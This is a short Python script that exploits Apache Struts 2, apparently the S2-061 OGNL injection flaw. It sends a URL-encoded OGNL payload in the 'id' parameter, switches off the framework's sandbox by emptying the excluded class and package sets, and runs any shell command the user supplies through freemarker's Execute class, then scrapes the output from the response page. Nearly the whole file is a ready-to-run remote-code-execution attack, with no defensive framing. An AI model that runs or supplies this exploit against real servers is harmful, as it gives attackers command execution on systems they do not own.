# encoding=utf-8
import requests
import sys
from lxml import etree
 
 
def exp(url,cmd):
    payload="%25%7b(%27Powered_by_Unicode_Potats0%2cenjoy_it%27).(%23UnicodeSec+%3d+%23application%5b%27org.apache.tomcat.InstanceManager%27%5d).(%23potats0%3d%23UnicodeSec.newInstance(%27org.apache.commons.collections.BeanMap%27)).(%23stackvalue%3d%23attr%5b%27struts.valueStack%27%5d).(%23potats0.setBean(%23stackvalue)).(%23context%3d%23potats0.get(%27context%27)).(%23potats0.setBean(%23context)).(%23sm%3d%23potats0.get(%27memberAccess%27)).(%23emptySet%3d%23UnicodeSec.newInstance(%27java.util.HashSet%27)).(%23potats0.setBean(%23sm)).(%23potats0.put(%27excludedClasses%27%2c%23emptySet)).(%23potats0.put(%27excludedPackageNames%27%2c%23emptySet)).(%23exec%3d%23UnicodeSec.newInstance(%27freemarker.template.utility.Execute%27)).(%23cmd%3d%7b%27"+cmd+"%27%7d).(%23res%3d%23exec.exec(%23cmd))%7d"
    total_url=url+"/?id="+payload
    r=requests.get(total_url)
    page=r.text
    page=etree.HTML(page)
    data = page.xpath('//a[@id]/@id')
    print(data[0])
 
if __name__=='__main__':
    if len(sys.argv)!=3:
        print("[+]ussage: http://ip:port command")
    url=sys.argv[1]
    cmd=sys.argv[2]
exp(url,cmd)